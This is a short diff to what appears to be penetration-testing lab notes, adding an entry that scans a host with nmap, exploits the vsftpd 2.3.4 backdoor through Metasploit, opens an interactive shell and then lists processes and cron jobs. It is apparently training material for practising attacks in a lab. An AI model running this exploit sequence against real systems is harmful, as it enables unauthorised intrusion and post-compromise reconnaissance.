@@ -1954,8 +1954,23 @@ cat /etc/networks
 cat /etc/hosts
 cat /etc/resolv.conf
 ```
-
-
+101) Enumerating Processes & Cron Jobs
+```
+ifconfig
+nmap -sV 192.183.4.3
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.183.4.3
+exploit
+/bin/bash -i
+CTRL + Z
+sessions -u 1
+sessions 2
+ps
+pgrep vsftpd
+cat /etc/cron*
+ls -al /etc/cron*
+```
 
 
 
